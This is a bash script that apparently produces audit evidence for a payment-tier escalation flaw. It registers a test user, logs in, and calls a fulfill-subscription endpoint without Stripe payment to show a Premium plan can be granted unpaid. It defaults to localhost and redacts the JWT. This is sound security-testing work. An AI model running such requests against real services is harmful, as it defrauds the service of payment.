#!/usr/bin/env bash
# VULN-02/03: Payment tier escalation without Stripe verification
set -euo pipefail

OUT_DIR="$(cd "$(dirname "$0")/../evidence" && pwd)"
API_BASE="${NEST_API_URL:-http://localhost:5002}"
LOCAL_API="${NEST_LOCAL_URL:-http://localhost:3000}"
OUT_FILE="$OUT_DIR/VULN-02-payment-escalation.txt"
TEST_EMAIL="${TEST_EMAIL:-security.tester@paksentiment.local}"
TEST_PASSWORD="${TEST_PASSWORD:-SecureTest123!}"

mkdir -p "$OUT_DIR"

pick_api() {
  for base in "$API_BASE" "$LOCAL_API"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "$base/" 2>/dev/null || echo "000")
    if [[ "$code" =~ ^(200|404)$ ]]; then
      echo "$base"
      return 0
    fi
  done
  echo "$API_BASE"
}

BASE=$(pick_api)

{
  echo "=== VULN-02/03 Payment Escalation Tests ==="
  echo "API base: $BASE"
  echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
  echo ""

  echo "--- Unauthenticated create-intent ---"
  curl -s -w "\nHTTP %{http_code}\n" -X POST "$BASE/payments/create-intent" \
    -H "Content-Type: application/json" \
    -d '{"amount":19,"planName":"Premium"}' 2>&1 | head -30
  echo ""

  echo "--- Register test user (may fail if exists) ---"
  REG=$(curl -s -w "\nHTTP %{http_code}\n" -X POST "$BASE/auth/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASSWORD\",\"confirmPassword\":\"$TEST_PASSWORD\",\"firstName\":\"Sec\",\"lastName\":\"Tester\"}" 2>&1)
  echo "$REG" | head -20
  echo ""

  echo "--- Login ---"
  LOGIN=$(curl -s -X POST "$BASE/auth/login-with-email-password" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASSWORD\"}" 2>&1)
  TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('accessToken','') or d.get('token',''))" 2>/dev/null || echo "")
  if [[ -z "$TOKEN" ]]; then
    echo "Login failed or API unreachable. Raw response:"
    echo "$LOGIN" | head -15
    echo ""
    echo "NOTE: Code review confirms fulfill-subscription accepts planName without payment proof."
    exit 0
  fi
  echo "JWT obtained (redacted in report): ${TOKEN:0:20}...[REDACTED]"
  echo ""

  echo "--- fulfill-subscription WITHOUT Stripe payment ---"
  curl -s -w "\nHTTP %{http_code}\n" -X POST "$BASE/payments/fulfill-subscription" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"planName":"Premium Plan"}' 2>&1
  echo ""

  echo "--- Decode JWT payload (middle segment only) ---"
  echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (-len(p) % 4)
try:
    print(json.dumps(json.loads(base64.b64decode(p)), indent=2))
except Exception as e:
    print('decode failed:', e)
" 2>/dev/null || true
} | tee "$OUT_FILE"

# Redact token in saved file for safety
sed -i.bak 's/Bearer ey[A-Za-z0-9._-]*/Bearer [REDACTED_JWT]/g' "$OUT_FILE" 2>/dev/null || \
  sed -i '' 's/Bearer ey[A-Za-z0-9._-]*/Bearer [REDACTED_JWT]/g' "$OUT_FILE" 2>/dev/null || true
rm -f "$OUT_FILE.bak"

echo "Saved: $OUT_FILE"
